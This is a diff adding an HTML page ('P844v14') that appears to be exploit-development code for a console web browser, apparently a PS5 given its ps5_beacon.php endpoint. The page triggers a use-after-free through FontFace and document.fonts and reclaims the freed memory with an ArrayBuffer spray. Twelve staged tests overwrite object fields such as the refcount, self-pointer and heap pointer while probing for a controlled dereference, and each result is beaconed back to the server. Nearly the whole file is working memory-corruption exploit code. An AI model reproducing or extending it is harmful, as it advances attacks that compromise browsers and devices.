@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v14</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+var KEY='p844v14_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+var testNum=getTest();
+log('P844v14 BOOT test='+testNum);
+bn('P844v14-BOOT','test='+testNum);
+
+function doUAF(id,cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:'UAF"+id+"';src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('UAF'+id+'F',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);void face.loaded;
+  var fabs=[],ffired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){if(ffired)return undefined;ffired=true;
+      st.remove();st.textContent='';st=null;
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em UAF'+id+'F,UAF'+id,'AB').then(function(){}).catch(function(){});
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var hi=-1,bv=null;
+    for(var i=0;i<fabs.length;i++){var t=new BigUint64Array(fabs[i]);if(t[0]!==0n||t[11]!==0n){hi=i;bv=t;break;}}
+    cb(bv?{abs:fabs,bv:bv,face:face,hitIdx:hi}:null);
+  },800);
+}
+function fin(tag,data){bn(tag,data);log(tag.replace('P844v14-','')+': '+data);setTimeout(function(){location.reload();},100);}
+
+var TESTS=[
+
+// T0: Baseline — longer wait (2s) then face.family, NO writes
+// Confirms the cached path still works after pipeline settles
+function(){
+  setTest(1);
+  doUAF('T0',function(r){
+    if(!r)return fin('P844v14-T0-OK','uaf=miss');
+    // Extra 1.5s wait to let pipeline fully settle
+    setTimeout(function(){
+      var fam='?',st='?';
+      try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+      try{st=r.face.status;}catch(e){st='ERR';}
+      // Full hex dump while we're here
+      var nz=[];
+      for(var i=0;i<24;i++){if(r.bv[i]!==0n)nz.push('q'+i+'=0x'+r.bv[i].toString(16));}
+      fin('P844v14-T0-OK','fam='+fam+'|st='+st+'|'+nz.join('|'));
+    },1500);
+  });
+},
+
+// T1: Write 0xDEAD at ALL 24 qwords AT ONCE (not one-by-one), then face.family
+// Reproduces the v13 T2 crash but without the iterative loop
+function(){
+  setTest(2);
+  doUAF('T1',function(r){
+    if(!r)return fin('P844v14-T1-OK','uaf=miss');
+    var bv=r.bv;
+    // Write sentinel at ALL qwords simultaneously
+    for(var i=0;i<24;i++)bv[i]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T1-OK','fam='+fam);
+  });
+},
+
+// T2: Write 0xDEAD only at ZERO offsets (q1-q10, q12, q14-q23), keep q0/q11/q13
+// Tests if making NULL pointers non-null triggers crashes
+function(){
+  setTest(3);
+  doUAF('T2',function(r){
+    if(!r)return fin('P844v14-T2-OK','uaf=miss');
+    var bv=r.bv;
+    // Only write at currently-zero offsets
+    for(var i=0;i<24;i++){
+      if(bv[i]===0n)bv[i]=0xDEAD0000DEADn;
+    }
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T2-OK','fam='+fam);
+  });
+},
+
+// T3: Write 0xDEAD only at q0 (corrupt refcount/vtable region)
+function(){
+  setTest(4);
+  doUAF('T3',function(r){
+    if(!r)return fin('P844v14-T3-OK','uaf=miss');
+    r.bv[0]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T3-OK','fam='+fam);
+  });
+},
+
+// T4: Write 0xDEAD only at q11 (corrupt the self-pointer)
+function(){
+  setTest(5);
+  doUAF('T4',function(r){
+    if(!r)return fin('P844v14-T4-OK','uaf=miss');
+    r.bv[11]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T4-OK','fam='+fam);
+  });
+},
+
+// T5: Write 0xDEAD only at q13 (corrupt the heap pointer)
+function(){
+  setTest(6);
+  doUAF('T5',function(r){
+    if(!r)return fin('P844v14-T5-OK','uaf=miss');
+    r.bv[13]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T5-OK','fam='+fam);
+  });
+},
+
+// T6: Write self at ALL zero offsets (valid heap address), keep q0/q11/q13
+// If T2 crashes but T6 doesn't, the system follows pointers at zero offsets
+// and valid addresses prevent the crash = CONTROLLED DEREFERENCE!
+function(){
+  setTest(7);
+  doUAF('T6',function(r){
+    if(!r)return fin('P844v14-T6-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    for(var i=0;i<24;i++){
+      if(bv[i]===0n)bv[i]=self; // fill zeros with valid heap address
+    }
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T6-OK','fam='+fam+'|self=0x'+self.toString(16));
+  });
+},
+
+// T7: face.load() with q0=1, all other qwords=self (valid heap pointers)
+// Tests if face.load() survives when all pointers are valid
+function(){
+  setTest(8);
+  doUAF('T7',function(r){
+    if(!r)return fin('P844v14-T7-OK','uaf=miss');
+    var bv=r.bv;
+    var self=bv[11]-BigInt(0x58);
+    bv[0]=1n; // keep refcount
+    for(var i=1;i<24;i++)bv[i]=self;
+    var o=[];
+    try{
+      var p=r.face.load();
+      o.push('load=ok');
+      p.then(function(){o.push('resolved');}).catch(function(e){o.push('rej:'+e.message.substring(0,30));});
+    }catch(e){o.push('load=ERR:'+e.message.substring(0,30));}
+    setTimeout(function(){
+      fin('P844v14-T7-OK',o.join('|')+'|self=0x'+self.toString(16));
+    },600);
+  });
+},
+
+// T8: Write 0xDEAD at q1 only (first zero offset after refcount)
+function(){
+  setTest(9);
+  doUAF('T8',function(r){
+    if(!r)return fin('P844v14-T8-OK','uaf=miss');
+    r.bv[1]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T8-OK','fam='+fam);
+  });
+},
+
+// T9: Write 0xDEAD at q2-q5 (offsets 0x10-0x28)
+function(){
+  setTest(10);
+  doUAF('T9',function(r){
+    if(!r)return fin('P844v14-T9-OK','uaf=miss');
+    r.bv[2]=0xDEAD0000DEADn;
+    r.bv[3]=0xDEAD0000DEADn;
+    r.bv[4]=0xDEAD0000DEADn;
+    r.bv[5]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T9-OK','fam='+fam);
+  });
+},
+
+// T10: Write 0xDEAD at q6-q10 (offsets 0x30-0x50)
+function(){
+  setTest(11);
+  doUAF('T10',function(r){
+    if(!r)return fin('P844v14-T10-OK','uaf=miss');
+    for(var i=6;i<=10;i++)r.bv[i]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T10-OK','fam='+fam);
+  });
+},
+
+// T11: Write 0xDEAD at q14-q23 (offsets 0x70-0xB8)
+function(){
+  setTest(12);
+  doUAF('T11',function(r){
+    if(!r)return fin('P844v14-T11-OK','uaf=miss');
+    for(var i=14;i<=23;i++)r.bv[i]=0xDEAD0000DEADn;
+    var fam='?';
+    try{fam=r.face.family;}catch(e){fam='ERR:'+e.message.substring(0,25);}
+    fin('P844v14-T11-OK','fam='+fam);
+  });
+}
+];
+
+var NAMES=['T0-baseline2s','T1-allDead','T2-zerosDead','T3-q0Dead','T4-q11Dead','T5-q13Dead',
+  'T6-zerosSelf','T7-loadSelf','T8-q1Dead','T9-q2to5Dead','T10-q6to10Dead','T11-q14to23Dead'];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v14-DONE','all='+TESTS.length);
+    clearTest();return;
+  }
+  log('Running '+NAMES[testNum]+'...');
+  try{TESTS[testNum]();}catch(e){
+    bn('P844v14-'+NAMES[testNum]+'-ERR',e.message);
+    setTest(testNum+1);setTimeout(function(){location.reload();},100);
+  }
+}
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
